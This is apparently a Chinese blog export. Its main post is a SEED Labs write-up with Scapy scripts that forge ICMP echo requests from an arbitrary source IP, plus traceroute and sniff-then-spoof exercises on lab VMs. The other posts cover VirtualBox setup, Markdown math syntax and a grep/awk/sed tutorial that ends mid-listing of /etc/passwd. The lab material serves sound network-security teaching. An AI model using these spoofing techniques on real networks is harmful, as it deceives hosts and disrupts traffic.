作为一个包欺骗工具，Scapy允许我们去设置IP数据包字段的任意值。这个任务的目的是冒充带有任意源IP地址的IP数据包。我们将冒充ICMP的echo请求数据包，并且把他们发送到处于相同网络的另一台VM上。我们将使用Wireshark来验证我们的请求是否会被另外一台接收者主机所接受。如果接收方接收到了，一个echo应答包将被发送到被冒充的IP地址上。以下代码展示了一个案例，即如何冒充一个ICMP数据包。 12345678&gt;&gt;&gt; from scapy.all import *&gt;&gt;&gt; a = IP() //1&gt;&gt;&gt; a.dst = ‘10.0.2.3’ //2&gt;&gt;&gt; b = ICMP() //3&gt;&gt;&gt; p = a/b //4&gt;&gt;&gt; send(p) //5.Sent 1 packets. In the code above, Line1 creates an IP object from the IP class; a class attribute（属性） is defined for each IP header field. We can use ls(a) or ls(IP) to see all the attribute names/values. We can also use a.show() and IP.show() to do the same. Line2 shows how to set the destination IP address field. If a field is not set, a default value will be used. 在以上代码中，行1从IP类中创建了一个IP对象；为每个IP头部字段定义一个类属性。我们能使用ls(a)或是ls(IP)来查看所有的属性名称/数值。我们也可以使用 a.show()和IP.show()来做同样的事情。行2展示了如何设置字段中的目的IP地址。如果一个字段没有设置，那将会使用默认的数值。 1234567891011121314&gt;&gt;&gt; ls(a)version : BitField (4 bits) = 4 (4)ihl : BitField (4 bits) = None (None)tos : XByteField = 0 (0)len : ShortField = None (None)id : ShortField = 1 (1)flags : FlagsField (3 bits) = &lt;Flag 0 ()&gt; (&lt;Flag 0 ()&gt;)frag : BitField (13 bits) = 0 (0)ttl : ByteField = 64 (64)proto : ByteEnumField = 0 (0)chksum : XShortField = None (None)src : SourceIPField = '10.0.2.4' (None)dst : DestIPField = '10.0.2.3' (None)options : PacketListField = [] ([]) Line 3 creates an ICMP object. The default type is echo request. In Line 4, we stack a and b together to form a new object. The / operator is overloaded by the IP class, so it no longer represents（代表） division（除法）; instead, it means adding b as the payload field of a and modifying（修改） the fields of a accordingly（从而，于是）. As a result, we get a new object that represent an ICMP packet. We can now send out this packet using send() in Line 5. Please make any necessary change to the sample code, and then demonstrate（证明） that you can spoof an ICMP echo request packet with an arbitrary source IP address. 行3创建了一个ICMP对象。默认类型是echo请求。在行4，我们把a和b堆叠在了一起以创建一个新的对象。/操作是被IP类重载，因此它将不在表示除法；相反，他意味着添加b作为a的负载字段，并且修改a的字段。（注：在这里的意思就是经常听到的，ICMP被IP封装。）结果就是，我们得到一个新的对象来代表一个ICMP数据包。在行5，我们现在就可以把这个数据包使用send()发送出去了。请对这段简单代码做出任何有必要的改变，然后证明你能欺骗一个带有任意源IP的ICMP请求数据包 我在VM1中的zhangshuaiyang这个目录下，又新建了一个文件，名为task1.2.py 文件代码如下。目的是想看下，我是否成功创建了一个冒充的数据包。因为VM1的ip地址是10.0.2.15，我把它设置成了10.0.2.55。如果不写这条语句a.src = &#39;10.0.2.55&#39;，那么默认使用的是设备的出口ip 123456789&gt; #!/usr/bin/python&gt; from scapy.all import *&gt; a = IP()&gt; a.src = '10.0.2.55'&gt; a.dst = '10.0.2.4'&gt; b = ICMP()&gt; p = a/b&gt; ls(p)&gt; 然后执行文件，显示如下。说明确实可以随意创建一个数据包，并改变其中内容 再次修改task1.2.py中的代码，修改如下。把显示ls()改成了发送send() 123456789&gt; #!/usr/bin/python&gt; from scapy.all import *&gt; a = IP()&gt; a.src = '10.0.2.55'&gt; a.dst = '10.0.2.4'&gt; b = ICMP()&gt; p = a/b&gt; send(p)&gt; 执行代码，展示如下。可以看到，在VM1中执行了该文件代码，然后再在VM2上用wireshark抓包。wireshark告诉我们，首先先是一个目的mac地址是08:00:27:04:d9:58（也就是VM1的mac地址）的主机发送了一个arp广播请求，然后VM2给出了单播回应。当VM1获得了VM2的mac地址，那么就可以封装数据包了。此时你能看到第三个包就是ICMP的包，同时ICMP的源IP是10.0.2.55。VM2收到ICMP请求，那么就要给出回应。需要给10.0.2.55这个IP回应，但是我们的实验环境中根本就没有10.0.2.55，所以VM2是获取不到10.0.2.55的mac地址的，也就无法封装数据包给回应。当VM2发送了三个请求10.0.2.55的mac地址arp数据包后，还没有收到arp回应，此时就停止发送arp广播请求了。 2.3 Task 1.3: Traceroute任务1.3 路由追踪 The objective of this task is to use Scapy to estimate（预估） the distance, in terms of number of routers, between your VM and a selected destination. This is basically what is implemented by the traceroute tool. In this task, we will write our own tool. The idea is quite straightforward: just send an packet (any type) to the destination, with its Time-To-Live (TTL) field set to 1 first. This packet will be dropped by the first router, which will send us an ICMP error message, telling us that the time-to-live has exceeded. That is how we get the IP address of the first router. We then increase our TTL field to 2, send out another packet, and get the IP address of the second router. We will repeat this procedure（程序，步骤） until our packet finally reach the destination. It should be noted that this experiment only gets an estimated result, because in theory（理论）, not all these packets take the same route (but in practice（练习）, they may within a short period of time). The code in the following shows one round in the procedure. 这个实验的目的是使用Scapy来预估在我们的VM和被选择的目的地之间的路径（以路由器的数量为单位）。这基本是通过路由追踪工具实现的。在这个任务中，我们将写一个我们自己的工具。这个想法相当简单直白：仅发送一个数据包（任意类型）到达目的地，并首先设置它的TTL字段为1。这个包将会被第一个路由器所丢弃，路由器则发送给我们一个ICMP错误信息。我们接下来增加我们的TTL字段为2，发送另一个数据包，则可以获得第二个路由器的IP地址。我们将重复这些步骤，直到我们的数据包最终到达目的地。需要注意的是，这个实验仅能获得一个预估的结果，因为理论上来说，不是所有的数据包都会经过同一个路由器（但是在练习中，他们可能会在很短的时间段内）。以下代码展示了在该过程中的一轮操作。 12345a = IP()a.dst = ’1.2.3.4’a.ttl = 3 b = ICMP()send(a/b) If you are an experienced Python programmer, you can write your tool to perform the entire procedure automatically. If you are new to Python programming, you can do it by manually changing the TTL field in each round, and record the IP address based on your observation（意见，注目） from Wireshark. Either way is acceptable, as long as you get the result. 如果你是一个经验丰富的Python程序员，你能写下你自己的工具来自动执行整个过程。如果你是一个Python新手，则可以通过在每个回合中手动更改TTL字段来实现，并根据Wireshark的观察记录IP地址。两种方式都是可以接受的，只要你获得了结果。 选第二个方式。。。。。 新建一个文件task1.3.py，代码如下 123456789101112&gt; #!/usr/bin/python&gt; from scapy.all import *&gt; &gt; a= IP()&gt; a.dst = "114.114.114.114"&gt; i = 0&gt; while i &lt; 20 :&gt; a.ttl = i&gt; b = ICMP()&gt; send(a/b)&gt; i = i+1&gt; 执行文件后，在wireshark中观察。通过黑色部分知道经过的跳数 2.4 Task 1.4: Sniffing and-then Spoofing任务1.4 嗅探然后欺骗 In this task, you will combine the sniffing and spoofing techniques to implement the following sniff-and- then-spoof program. You need two VMs on the same LAN. From VM A, you ping an IP X. This will generate（产生） an ICMP echo request packet. If X is alive, the ping program will receive an echo reply, and print out the response. Your sniff-and-then-spoof program runs on VM B, which monitors（监控） the LAN through packet sniffing. Whenever it sees an ICMP echo request, regardless（无论） of what the target IP address is, your program should immediately send out an echo reply using the packet spoofing technique. Therefore, regardless of whether machine X is alive or not, the ping program will always receive a reply, indicating that X is alive. You need to use Scapy to do this task. In your report, you need to provide evidence（证据） to demonstrate that your technique works. 在这个任务中，你将结合嗅探和欺骗技术来实现以下的嗅探然后欺骗程序。你需要在同一个局域网中有2个VM。从VM A，你ping一个IP X。这将产生一个ICMPecho请求数据包。如果X是活跃状态，ping程序将会接收一个echo回应，并且打印出回应结果。你的嗅探然后欺骗程序运行在VM B，它监控这个局域网通过的数据包。每当它看到ICMP echo请求时，无论目标IP地址是什么，你的程序都应立即使用数据包欺骗技术发出回显应答。因此，无论机器X是否处于活动状态，ping程序都将始终收到答复，表明X处于活动状态。你需要使用Scapy来完成该任务。在你的报告中，你需要提供证据以证明你的技术有效。 上述实验应该要在连接设备是集线器的情况下（或是称之为CSMA/CD环境）使用。如果连接终端的设备是交换机，那么局域网中的其他终端很可能不会收到数据包。而在CSMA/CD的环境中，那么终端才会收到这个网络环境里面的数据包 同时ping测试的时候，VM1不能ping同网段的ip地址，因为ping同网段的地址，那么数据包封装的时候，在数据链路层会需要同网段ip的目的mac，也就会导致发送arp广播请求，而VM2收到广播请求，如果不写代码程序，那么它不会回应这个arp广播请求做欺骗 如果是ping不同网段ip时，那么数据包会经过网关转发，这样的ping包由于在CSMA/CD的环境中，那么VM2就能收到该数据包]]></content>
      <categories>
        <category>SEED Labs</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[如何使用VirtualBox运行SEED_Ubuntu_VM？]]></title>
    <url>%2F2019%2F09%2F07%2F%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8VirtualBox%E8%BF%90%E8%A1%8CSEED_Ubuntu_VM%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[官方原文档 Install the free VirtualBox software first. We recommend Version 6.0.4 (please stay away from the newer versions, as they still have some issues with our VM). 首先安装免费的VirtualBox软件。 我们建议使用版本6.0.4（请远离新版本，因为它们仍然存在我们的VM的一些问题）。 Step 1: Create a New VM in VirtualBox步骤1：在VirtualBox中创建一个新的VM Step 2: Provide a Name and Select the OS Type and Version步骤2：进行命名，同时选择操作系统的类型与版本 Do NOT pick Ubuntu (64-bit), even though your machine is 64 bit. Our prebuilt VM is 32-bit Ubuntu. 不要选择Ubuntu (64-bit)，尽管你的机器是64位的。我们预建的VM是32位的Ubuntu。 Step 3: Set the Memory Size步骤3：设置内存容量 Step 4: Select the Pre-built VM File Provided by Us步骤4： 选择使用我们提供的预建的VM文件 In the above step, you may encounter(遭遇) the following error; otherwise, directly go to Step 5.在上面的步骤中，你可能会遇到以下错误; 如果没有，则直接转到步骤5。 Reason and Solution: This is because you copied the VM files from another VM, which is already loaded into VirtualBox. These two VMs have the same UUID, which is not allowed by Virtualbox. Here are several solutions depending on your situations: 原因和解决方法：这是因为你从其他VM复制VM文件，而这个VM已经被加载过VirtualBox中了。这两个VM有着同样的UUID，而在VirtualBox中是不允许这样的。取决于你的状况，有以下几个解决方案： If you plan to create multiple VMs using the same image, please use the clonemechanism (See Appendix A for details). 如果你使用相同的镜像创建多个VM，请使用克隆机制（更多细节请参考附录A） If the older VM with the same UUID is no longer needed, remove it from VirtualBox will solve the problem. 如果不再需要具有相同UUID的旧的VM，则从VirtualBox中删除它可以解决问题。 If you do want to keep the older VM, you can change the UUID of the new VM. The fastest way is to directly modify SEEDUbuntu16.04.vmdk, which is a text file. Search for the ddb.uuid.image entry, and change its value (e.g., change the last byte from ‘d’ to ‘e’) 如果你确实想要保留旧的VM，你可以为新的VM修改UUID。 最快的方法是直接修改SEEDUbuntu16.04.vmdk，这是一个文本文件。 搜索ddb.uuid.image条目，并更改其值（例如，将最后一个字节从“d”更改为“e”） If there is no error (or after you fix the error), your VM will be created successfully. 如果没有出现错误（或是你已经修复了错误），你的VM将成功创建。 Step 5: Configure the VM步骤5：配置VM Step 6: Start the VM步骤6：启动VM Step 7: Stop the VM or Save the VM’s State步骤7：停止VM或是保存VM的状态 When you are done with your VM, you can always shut it down (from inside Ubuntu). A better alternative is to “freeze” the computer, so everything is saved. When you need it again, you can “unfreeze” it, and resume from where you left off. This is much faster and convenient than shutting down and rebooting the VM. To achieve this, you can use the “Save State” option. 用完VM后，你可以随时关闭它（从Ubuntu内部）。 更好的选择是“freeze冻结”计算机，以便保存所有内容。 当你再次需要它时，你可以“unfreeze解冻”它，并从你离开的地方恢复。 这比关闭和重新启动VM快得多，方便快捷。 为此，你可以使用“Save State保存状态”选项。 Appendix A: Use “Clone” to create Multiple VMs附录A：使用“克隆”以创建多个VM Some SEED labs require multiple VMs. The easiest way to create multiple VMs is to create one first, and then use the “Clone” mechanism to clone it. Before doing the cloning, please ensure the following: 一些SEED实验需要多个VM。 创建多个VM的最简单方法是首先创建一个，然后使用“克隆”机制来克隆它。 在进行克隆之前，请确保以下内容： IMPORTANT: make sure that the VM is fully shutdown (not in a “Saved” state), or there will be all sorts of problems. 重要：确保你的VM已经完全关闭（而不是处于“保存状态”），不然可能会有各种各样的问题。 Configure network (see Appendix B); otherwise you have to do it for each VM. 配置网络（参考附录B）；不然你就得为每个VM配置它了。 Configure folder sharing (see Appendix D); otherwiseyou have to do it for each VM. 配置文件夹共享（参考附录B）；不然你就得为每个VM配置它了。 The clone will take a few minutes, depending on the speed of your computer. 克隆将会持续几分钟，这取决于你的电脑。 Appendix B: Network Configuration in VirtualBox for SEED Labs附录B：为SEED实验在VirtualBox上配置网络 In many of the SEED labs, we need to run multiple guest VMs, and these VMs should be able to (1) reach out to the Internet, (2) communicate with each other. In Virtualbox, if we use the “NAT” setting (default setting) for each VM, we can achieve 1, but not 2, because each VM will be placed in its own private network, not on a common one; they even have the same IP address, which is not a problem because each VM is the only computer on its own private network. On the other hand, if we use the “Host-only” setting for each VM, we can achieve 2, but not 1. Using this setting, all the VMs and the host will be put on a common network, so they can communicate with each other; however, due to the lack of NAT, the VMs cannot reach out to the outside. 在许多SEED实验中，我们需要运行多个客户虚拟机，这些虚拟机应该能够（1）接入互联网，（2）相互通信。在Virtualbox中，如果我们为每个VM使用“NAT”设置（默认设置），我们可以实现1而不是2，因为每个VM将放置在自己的专用网络中，而不是普通的网络中;它们甚至具有相同的IP地址，这不是问题，因为每个VM是其自己的专用网络上唯一的计算机。另一方面，如果我们为每个VM使用“仅主机”的设置，我们可以实现2但不能达到1.使用此设置，所有VM和主机将被放在一个公共网络上，因此它们可以进行通信彼此;但是，由于缺少NAT，虚拟机无法与外界联系。 Therefore, in order to achieve all these 2 goals, we have to use a network adapter called “NAT Network”. The adapter works in a similar way to “local area network” or LAN. It enable VMs communication within same local network as well as the communication to the internet. All the communication goes through this single adapter. As show in Figure 1, gateway router transfers the packets among the VMs and transfers the packets from local network to Internet. 因此，为了同时实现这两个目标，我们必须使用称为“NAT网络”的网络适配器。适配器的工作方式与“局域网”或LAN类似。它支持在同一本地网络内进行VM通信以及与Internet的通信。所有通信都通过这个单一适配器。如图1所示，网关路由器在VM之间传输数据包，并将数据包从本地网络传输到Internet。 Configuration Instruction配置介绍 Step 1: Make sure you are using the most up-to-date VirtualBox. As show in the following figure, click the “File” on the top left of the VirtualBox main UI. Then choose “Preferences…” option. 步骤1：确保您使用的是最新的VirtualBox。 如下图所示，单击VirtualBox主UI左上角的“文件”。 然后选择“首选项…”选项。 Step 2: Click the “Network” tab on left panel. click the “+” button to create a new NAT Networks (NatNetwork) adaptor (if one does not exist). Double click on the NatNetwork, and look at its specifications. Set the specifications as the same as what is shown below. 步骤2：点击左侧栏中的“网络”键。点击“+”号按钮以创建一个新的NAT网络适配器（如果一个都没有的话）。双击这个NatNetwork，并且查看它的格式规范，照下图的配置来进行设置。 Step 4: Go to VM setting, you need to power off the VM before making the following changes. Enable Adapter 1(at the same time, disable the other adapters), and choose “NAT Network”. 步骤4：回到VM的设置，你需要确保在做以下操作的前已经对VM完全关机。开启适配器1（与此同时关闭其他适配器），并且选择“NAT网络”。 Step 5: Now power on the VM, and check the IP address. 步骤5：现在开启VM，并且检查IP地址 Troubleshooting: If VMs can not ping each other, refresh the MAC Address can resolve the issue. The way to resolve the issue is shown in figure 4, troubleshoot 1. 如果VM之间无法互相ping通，重新获取MAC地址能解决该问题。解决问题的方法在上面步骤4，点击那个 troubleshoot 1。 Appendix C: Take Snapshots and Recover from Snapshots附录C：创建快照与从快照中恢复 For some labs, you may need to make changes to the operating system. If you make a severe mistake, your VM may not be able to boot up again, and you will lost everything inside the failed VM. have done. To avoid such trouble, before doing anything dangerous to the OS, it is better to take a snapshot of your current VM. You can take as many snapshots as you want. 对于一些实验，你可能需要对操作系统做出改变。如果你的操作导致服务器出现问题，你的VM可能无法再次启动了，并且你将丢失在这个故障VM中的所有内容。在对操作系统做任何危险操作前，为了避免上述问题出现，最好就是对当前的VM创建快照。只要你想，你能创建任意个数量的快照。 To restore from a snapshot that you have taken before, you can click the followings (you need to shut-down the VM first): 要从之前拍摄的快照还原，可以单击以下内容（你需要先关闭VM）： Appendix D: Folder Sharing附录D：文件夹分享 Files can be shared between the host computer and the guest operating system in VirtualBox. The following steps show how to do so. 在主机电脑和VirtualBox中的客户操作系统间，文件是可以共享的。以下步骤将告诉你如何去做。 Create the folder to be shared on the host computer. In this tutorial we name the folder share. 在主机电脑上创建一个用于共享的文件夹。在本教程中，我们给文件夹取名叫share。 Boot the Guest operating system in VirtualBox. 在VirtualBox中启动用户操作系统。 Go to the Settings popup window, and select “Shared Folders” 回到设置弹出窗口，并选择“分享文件夹”。 Choose the ‘Add’ button. 选择“添加”按钮。 Choose “Other …”, and select a folder from the popup window. 选择“其他……”，并从弹出窗口中选择文件夹。 Select Auto Mount and Make Permanent option. Click OK. Click OK again to close the Settings Dialog. 选择动态挂载和Make Permanent（常设，永久） 选项。点击完成。再次点击完成以关闭设置对话框。 Open a terminal in the VM. Make a directory and name it host (you can choose any name you like). Use command “mkdir /home/seed/host” 打开VM中的终端，创建一个目录并将其命名为host（你可以选择任何您喜欢的名称）。使用命令“mkdir /home/seed/host”（因为上面那张图的挂载目录写的就是这个文件夹地址，所以你也得确保在VM中创建了这个文件夹） We want files in our mount point (~/host) to be owned by the current user. Also we want the mounted shared folder to persist after reboot. Hence, we will edit the /etc/rc.local file (using “sudo gedit /etc/rc.local”) and add the command below (1000 is the User ID and group ID of the user seed): 我们希望挂载点（〜/ host）中的文件归当前用户所有。 此外，我们希望挂载的共享文件夹在重新启动后保持不变。 因此，我们将编辑 /etc/rc.local文件（使用“sudo gedit /etc/rc.local”）并添加以下命令（1000是用户ID和用户种子的组ID）： sudo mount -t vboxsf -o rw,uid=1000,gid=1000 share /home/seed/host Save the changes and reboot VM. Now anything placed in /home/seed/host inside the VM should be visible from the share folder on the host machine, and vice versa. 保存更改并重启VM。 现在，从主机上的共享文件夹中可以看到放在VM中/home/seed/host中的任何内容，反之亦然。]]></content>
      <categories>
        <category>SEED Labs</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[markdown语法]]></title>
    <url>%2F2019%2F08%2F11%2Fmarkdown%E8%AF%AD%E6%B3%95%2F</url>
    <content type="text"><![CDATA[插入数学公式在Markdown中插入数学公式的语法是$数学公式$和$$数学公式$$。 行内公式是可以让公式在文中与文字或其他东西混编，不独占一行。 示例 1质能方程$E = mc^2$ 显示 质能方程$E=mc^2$ 独立公式使公式单独占一行，不与文中其他文字等混编。 示例 1质能方程$$E = mc^2$$ 显示 质能方程 $$E=mc^2$$ 普通公式普通的加减乘除数学公式的输入方法与平常的书写一样。 示例 1$$x = 100 * y + z - 10 / 33 + 10$$ 显示 $$x=100∗y+z−10/33+10$$ 上下标使用^来表示上标，_来表示下标，同时如果上下标的内容多于一个字符，可以使用{}来将这些内容括起来当做一个整体。与此同时，上下标是可以嵌套的。 示例 1$$x = a_&#123;1&#125;^n + a_&#123;2&#125;^n + a_&#123;3&#125;^n$$ 显示 $$x = a_{1}^n + a_{2}^n + a_{3}^n$$ 如果希望左右两边都能有上下标，可以使用\sideset语法 示例 1$$\sideset&#123;^1_2&#125;&#123;^3_4&#125;A$$ 显示 $$\sideset{^1_2}{^3_4}A$$ 括号()，[]和|都表示它们自己，但是{}因为有特殊作用因此当需要显示大括号时一般使用\lbrace \rbrace来表示。 示例 1$$f(x, y) = 100 * \lbrace[(x + y) * 3] - 5\rbrace$$ 显示 $$f(x, y) = 100 * \lbrace[(x + y) * 3] - 5\rbrace$$ 分数分数使用\frac{分母}{分子}这样的语法，不过推荐使用\cfrac来代替\frac，显示公式不会太挤。 示例 1$$\frac&#123;1&#125;&#123;3&#125; 与 \cfrac&#123;1&#125;&#123;3&#125;$$ 显示 $$\frac{1}{3} 与 \cfrac{1}{3}$$ 开方开方使用\sqrt[次数]{被开方数}这样的语法 示例 12$$\sqrt[3]&#123;X&#125;$$$$\sqrt&#123;5 - x&#125;$$ 显示 $$\sqrt[3]{X}$$$$\sqrt{5 - x}$$ 希腊字母见下表 代码 大写 代码 小写 A A \alpha α B B \beta β \Gamma Γ \gamma γ \Delta Δ \delta δ E E \epsilon ϵ Z Z \zeta ζ H H \eta η \Theta Θ \theta θ I I \iota ι K K \kappa κ \Lambda Λ \lambda λ M M \mu μ N N \nu ν \Xi Ξ \xi ξ O O \omicron ο \Pi Π \pi π P P \rho ρ \Sigma Σ \sigma σ T T \tau τ \Upsilon Υ \upsilon υ \Phi Φ \phi ϕ X X \chi χ \Psi Ψ \psi ψ \Omega Ω \omega ω 其他字符关系运算符 符号 代码 ± \pm × \times ÷ \div ∣ \mid ∤ \nmid ⋅ \cdot ∘ \circ ∗ \ast ⨀ \bigodot ⨂ \bigotimes ⨁ \bigoplus ≤ \leq ≥ \geq ≠ \neq ≈ \approx ≡ \equiv ∑ \sum ∏ \prod ∐ \coprod 集合运算符 符号 代码 ∅ \emptyset ∈ \in ∉ \notin ⊂ \subset ⊃ \supset ⊆ \subseteq ⊇ \supseteq ⋂ \bigcap ⋃ \bigcup ⋁ \bigvee ⋀ \bigwedge ⨄ \biguplus ⨆ \bigsqcup 对数运算符 符号 代码 log \log lg \lg ln \ln 三角运算符 符号 代码 ⊥ \bot ∠ \angle sin \sin cos \cos tan \tan cot \cot sec \sec csc \csc 微积分运算符 符号 代码 ′ \prime ∫ \int ∬ \iint ∭ \iiint ∬∬ \iiiint ∮ \oint lim \lim ∞ \infty ∇ \nabla d \mathrm{d}]]></content>
      <categories>
        <category>小技巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[grep/正则表达式/awk/sed]]></title>
    <url>%2F2019%2F08%2F11%2Fgrep-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-awk-sed%2F</url>
    <content type="text"><![CDATA[Linux三剑客 grep适合单纯的查找或是匹配文本 sed适合编辑我们查找到的文本 awk对于查找到的文本，可以进行格式化处理，即输出成我们想要看到的样子 正则表达式是公式。我们可以在三剑客中按（正则表达式）条件查找到我们需要的东西 1.grepgrep（global search regular expression and print out the line） grep “需要搜索的字符” grep -i “需要搜索的字符” 不区分大小写 grep -n “需要搜索的字符” 在行首显示字符所在行号 grep –color=auto “需要搜索的字符” 字符用颜色显示 grep –color “需要搜索的字符” 字符用颜色显示 grep -c “需要搜索的字符” 显示字符一共所在多少行 grep -o “需要搜索的字符” 显示字符，在单独的一行输出 grep -Bx “需要搜索的字符” 显示字符所在的行及其前x行 grep -Ax “需要搜索的字符” 显示字符所在的行及其后x行 grep -Cx “需要搜索的字符” 显示字符所在的行及其前后x行 grep -w “需要搜索的字符” 精确显示字符所在的行，比如字符是abc，就不会显示abcd所在行 grep -v “需要搜索的字符” 显示不包含该字符所在的行 grep -e “需要搜索的字符” -e “需要搜索的字符2” 显示多个目标字符所在行 2.正则表达式2.1基本正则表达式grep “^hello” 打印出以hello开头的行 grep “hello$” 打印出以hello结尾的行 grep “^hello$” 打印出只有hello单词的行 grep “^$” 打印出空行，该行中有空格也不能算是一个空行 grep “\ &lt; hello” 打印出以hello作为一个单词词首的一行 grep “hello\ &gt;” 打印出以hello作为一个单词词尾的一行 grep “\ &lt; hello\ &gt;” 打印出以hello作为一个单词的一行 同时可以使用\ b来表示锚定词首或词尾，即来替代\ &gt;和\ &lt; 使用\ B可以表示词首或词尾不是某个单词 连续次数的匹配grep “a\ {3\ }” 打印出单词中有3个连续a的一行 grep “\ &lt; a\ {3\ } \ &gt;” 打印出单词中只有3个连续a的一行（以连续3个a作为一个单词） grep “a\ {2,4\ } “ 打印出单词中至少有连续2个a或最多连续4个a的一行 grep “a\ { ,4\ } “ 打印出单词中最多连续4个a的一行 grep “a\ {2,\ } “ 打印出单词中至少连续2个a的一行 grep “a*” 打印出单词中有n个a的一行 grep “a.*” 打印出单词中有a且a后面接上任意个数目及字符的行 grep “a\ ?” 打印出单词中能匹配到0个或1个a的行（其实有2个以上的a也能匹配到，因为2个以上的a包含0个或1个a） grep “a\ +” 打印出单词中能匹配到至少1个a的行 常用符号grep “a…” 打印出单词中能匹配到a后面接上3个任意字符的行 grep “a[[:alpha:]]\ { 3\ }” 打印出单词中能匹配到a后面接上了3个任意大小写字母的行 [[:alpha:]] 表示任意大小写字母[[:lower:]] 表示任意小写字母[[:upper:]] 表示任意大写字母[[:digit:]] 表示0到9之间的任意单个数字（包括0和9）[[:alnum:]] 表示任意数字或字母[[:space:]] 表示任意空白字符，包括”空格”、”tab键”等。[[:punct:]] 表示任意标点符号 [0-9]与[[:digit:]]等效[a-z]与[[:lower:]]等效[A-Z]与[[:upper:]]等效[a-zA-Z]与[[:alpha:]]等效[a-zA-Z0-9]与[[:alnum:]]等效 grep “a[ ^[:alpha:]]\ { 3\ }” 打印出单词中能匹配到a后面接上了3个不是大小写字母的行 [^ 0-9]与[ ^[:digit:]]等效[ ^ a-z]与[ ^[:lower:]]等效[ ^ A-Z]与[ ^[:upper:]]等效[ ^ a-zA-Z]与[ ^[:alpha:]]等效[ ^ a-zA-Z0-9]与[ ^[:alnum:]]等效 grep “a[efg]” 打印出单词中能匹配到a后面接上了e或f或g的行 grep “a[ ^efg]” 打印出单词中能匹配到a后面接上不是e或f或g的行 同时还有简短格式，但是并非所有正则表达式解析器都可以识别。使用的时候可以尝试加上-P参数\d 表示任意单个0到9的数字\D 表示任意单个非数字字符\t 表示匹配单个横向制表符（相当于一个tab键）\s表示匹配单个空白字符，包括”空格”，”tab制表符”等\S表示匹配单个非空白字符 分组及向后引用grep “\ (hello\ ) \ {2\ }” 以hello为一个组（第一个分组），打印出单词中能匹配到2次hello的行 grep “\ (hello\ ) word \1” 以hello为一个组，打印出有hello word hello的行。其中\1表示第一个分组 转义符grep “a\ .\ .” 打印出单词中能匹配到a..的行 grep “a\ \ *” 打印出单词中能匹配到a*的行 grep ‘a\ \ \ \ ‘ 打印出单词中能匹配到a\ \的行，注意此时使用单引号 2.2扩展正则表达式使用扩展正则表达式时，要加上-E参数 在扩展正则表达式中，有|这个符号，按住“shift键”和“\键”就可以打出 grep -E “(com|net)$” 打印出以com或net结尾的行 在基本正则表达式中需要加\，但是扩展中不需要的如下： ? 表示匹配其前面的字符0或1次 + 表示匹配其前面的字符至少1次，或者连续多次，连续次数上不封顶。 {n} 表示前面的字符连续出现n次，将会被匹配到。 {x,y} 表示之前的字符至少连续出现x次，最多连续出现y次，都能被匹配到，换句话说，只要之前的字符连续出现的次数在x与y之间，即可被匹配到。 {,n} 表示之前的字符连续出现至多n次，最少0次，都会被匹配到。 {n,}表示之前的字符连续出现至少n次，才会被匹配到。 分组与后向引用( ) 表示分组，我们可以将其中的内容当做一个整体，分组可以嵌套。(ab) 表示将ab当做一个整体去处理。\1 表示引用整个表达式中第1个分组中的正则匹配到的结果。\2 表示引用整个表达式中第2个分组中的正则匹配到的结果。 3.awk awk的基本语法结构 awk [options] ‘Pattern {Action}’ file1,file2 如果是对命令执行awk操作而不是文件，那么可以使用命令+管道符（|）+awk 3.1基础入门df |awk ‘{print $5}’ 表示输出df信息的第五列 df |awk ‘{print $4,$5}’ 表示输出df信息的第四和第五列 除了输出文本或命令输出信息中的列，我们也可以自己添加信息，只需在””中添加即可 awk ‘{print “anychar:”$4,”anychar2”$5}’ file1 如果写成如下格式，那么输出的就不是第五列，而是输出$5 df |awk ‘{print “$5”}’ Pattern中文含义是模式，特殊的2种模式BEGIN和END 在执行文件1（file1）前，先执行BEGIN的内容，即先把aaa输出，然后再对文件1做处理，处理方式就是后面写的动作 awk ‘BEGIN{print “aaa”} {print “anychar:”$4,”anychar2”$5}’ file1 在执行完对文件1（file1）的操作后，再在结尾执行END的内容，即输出aaa awk ‘{print “anychar:”$4,”anychar2”$5} END{print “aaa”}’ file1 3.2分隔符3.2.1输入分割符文本输入的时候，默认是以空格作为分割符号的，但是我们可以手工指定在文本中的一行，该以什么符号作为区分一列的分割符 awk -F# ‘{print $4,$5}’ file1 通过-F参数，来指定#作为输入分割符 awk -v FS=’#’ ‘{print $4,$5}’ file1 通过-v参数，来修改系统内置的输入分割符变量，效果同上 3.2.2输出分割符文本输出的时候，默认也是以空格作为分割符号的，但是我们可以指定其他的符号来连接不同的列 awk -v OFS=’++++’ ‘{print $4,$5}’ file1 通过-v参数，来修改系统内置的输出分割符变量 注：输出分割时，用“，”来区分。如果是想把两列连在一起，可以写成以下形式 awk ‘{print $4$5}’ file1 3.3awk变量3.3.1内置变量 名称 代码 输入分割符 FS 输出分隔符 OFS 输入记录分隔符 RS 输出记录分割符 ORS 当前行被分割成了几列 NF 行号 NR 各文件分别记录行号 FNR 当前文件名 FILENAME 命令行参数的个数 ARGC 保存的是命令行所给的各参数 ARGV awk ‘{print NR,NF}’ file1 表示输出文件1中的行号及该行的列数 FS和OFS都是以每行各个字符间隔为单位 RS和ORS是来判断以什么条件来作为换行，默认情况下，系统认为是回车即换行 3.3.2自定义变量awk -v 变量名称=”变量值” eg： awk -v mychar=”hahaha” ‘BEGIN｛print mychar｝’ or： awk -v ‘BEGIN｛mychar=”hahaha” ; print mychar｝’ 3.4格式化 3.5模式 使用正则表达式 awk ‘/正则表达式/ {print $0}’ file1 3.6动作 4.sed awk的基本语法结构 awk [options] ‘动作’ 4.1新增与删除sed ‘sed 2,5d’ 其中d表示删除，意味删除2到第5行 1234567891011121314151617181920212223242526[root@vultr ~]# nl /etc/passwd 1 root:x:0:0:root:/root:/bin/bash 2 bin:x:1:1:bin:/bin:/sbin/nologin 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin 5 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin 6 sync:x:5:0:sync:/sbin:/bin/sync 7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown 8 halt:x:7:0:halt:/sbin:/sbin/halt 9 mail:x:8:12:mail:/var/spool/mail:/sbin/nologin 10 operator:x:11:0:operator:/root:/sbin/nologin 11 games:x:12:100:games:/usr/games:/sbin/nologin 12 ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin 13 